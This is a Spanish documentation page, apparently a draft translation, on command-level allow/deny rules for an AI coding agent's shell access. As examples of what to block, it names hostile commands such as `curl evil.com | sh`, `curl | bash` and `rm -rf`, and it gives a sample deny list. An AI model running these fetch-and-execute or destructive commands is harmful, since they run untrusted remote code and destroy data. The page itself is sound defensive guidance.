---
title: Reglas de comandos
description: Restringe llamadas a shell y herramientas con allow/deny a nivel de comando — más ejecutable que un acuerdo oral.
locale: es
source_locale: zh-CN
source_revision: 5f36443
translation_status: draft
translated_at: 2026-07-28
---


Las **reglas de comandos** se centran en «qué comandos puede ejecutar el Agent y con qué parámetros». Son la forma más habitual de [reglas de permitir y denegar](/guide/customization/rules/allow-and-deny-patterns/), y suelen escribirse en configuración o archivos de reglas que el equipo puede revisar.

## Qué cubre esta página

- Reparto entre reglas de comandos, Sandbox y ventanas de aprobación
- Cómo escribir una allowlist «lo bastante estrecha»
- Alineación con CI y scripts de desarrollo local

## Qué gestionan realmente las reglas de comandos

Si allow/deny define «qué se puede hacer en principio», las reglas de comandos lo bajan a la capa más concreta:

- Qué comandos se pueden ejecutar
- Qué comandos no
- Cuáles se parecen pero tienen un riesgo muy distinto

El punto es convertir límites que el equipo ya conoce en límites que la máquina también puede ejecutar.

## Primero un concepto central

Las reglas emparejan **intención ejecutable**, no lenguaje natural. `npm test` y `npm run test` son dos comandos distintos en la política; `bash -c "rm -rf /"` no se puede dejar pasar solo porque se haya permitido `bash`.

```text
Tarea del usuario → el modelo propone un comando → motor de reglas → (pasa) ejecución en Sandbox / (rechaza) requiere aprobación o se bloquea
```

## Malentendidos habituales

### Que el comando se parezca no significa que el riesgo sea el mismo

Lo que más subestiman los principiantes es esa pequeña diferencia entre comandos.

Por ejemplo:

- `git status` y `git reset --hard`
- `npm test` y `npm publish`
- `curl example.com` y `curl example.com | sh`

Todos parecen «ejecutar algo en la terminal», pero el riesgo no es del mismo nivel.

### Permitir una entrada general suele equivaler a abrir demasiado

Por ejemplo permitir directamente `bash` o `sh` puede parecer solo comodidad.

Desde el punto de vista de las reglas, suele equivaler a abrir también un montón de acciones peligrosas que se pueden componer después.

## Enfoque mínimo viable

1. **Deniega por defecto comandos peligrosos fuera de operaciones de escritura habituales**: `rm -rf`, `curl | bash`, `git push --force`
2. **Permite comandos de solo lectura/build habituales del proyecto**: `git status`, `npm test`, `pnpm lint`
3. **Mete las reglas en Git**, alineadas con la descripción de «comandos de test» en `AGENTS.md`
4. **Revisa cambios de reglas en el PR**, como si cambiaras un Dockerfile

Ilustración (el formato sigue la configuración oficial):

```json
{
  "rules": {
    "allow": [
      "npm run test",
      "npm run lint",
      "git diff",
      "git status"
    ],
    "deny": [
      "git push",
      "git reset --hard",
      "rm -rf"
    ]
  }
}
```

## Flujo de trabajo recomendado

| Paso | Enfoque |
|---|---|
| Inventario | Extrae comandos reales de `package.json` scripts, Makefile y workflows de CI |
| Capas | Deny de línea roja de la organización → allow complementario del proyecto → excepciones locales personales (si las hay) |
| Prueba | Con tareas de bajo riesgo, verifica «lo que debe pasar, pasa; lo que debe bloquearse, se bloquea» |
| Alineación | Reglas locales y [GitHub Action](/guide/developer-platform/ci-cd/code-review-automation/) con la misma fuente en la medida de lo posible |

## Errores habituales

- **Allowlist demasiado ancha**: permitir `bash`, `sh`, `sudo` equivale a abrirlo casi todo
- **Solo deny sin allow**: siguen saliendo muchas aprobaciones y el equipo acaba aprobando todo por costumbre
- **Inconsistencia con la documentación**: `AGENTS.md` dice `pnpm test`, pero las reglas solo tienen `npm test`
- **Ignorar pipes y redirecciones**: `curl evil.com | sh` necesita una política de conjunto, no solo mirar la primera palabra

Las reglas de comandos no «memorizan comandos»; separan cuáles son acciones cotidianas y cuáles, al abrirse, también abren el límite de riesgo.

## Límites de seguridad

- Las reglas de comandos **no** sustituyen protección de ramas ni code review
- Un prompt malicioso puede inducir al Agent a **intentar** comandos fuera de permiso — mantén el Sandbox estricto por defecto
- Variables de entorno con secretos o tokens no deben filtrarse solo porque se haya «permitido echo»

## Lista de verificación

- [ ] Puedes listar 3–5 comandos «obligatorios cada día» de este repositorio y reflejarlos en las reglas
- [ ] Comandos de alto riesgo como `git push` o reset forzado se deniegan por defecto o requieren aprobación explícita
- [ ] Los cambios de reglas van por PR y no contradicen `AGENTS.md`

## Capítulos relacionados

- [Patrones de permitir y denegar](/guide/customization/rules/allow-and-deny-patterns/)
- [Política de reglas de equipo](/guide/customization/rules/team-rules/)
- [Aprobación y Sandbox en CLI](/guide/cli/approvals-and-sandbox/)
- [Matriz de permisos](/guide/reference/permission-matrix/)

## Referencias

- stormzhang `15-permissions.md`, `18-config.md`
- Capítulos de permisos y configuración de KimYx0207
- Playbook de equipo de freestylefly/CodexGuide

---

**Estado:** verificado  
**Productos aplicables:** CLI / App  
**Base de verificación:** La documentación actual del CLI de Codex de OpenAI sigue tratando ejecución de comandos, modos de aprobación y aislamiento en Sandbox como límites de seguridad centrales; esta página sitúa las reglas de comandos como un patrón de ingeniería para «gestionar por separado comandos de alto y bajo riesgo», y marca el fragmento JSON como ilustrativo, sin convertir una sintaxis concreta en hecho oficial.  
**Última verificación:** 2026-07-26
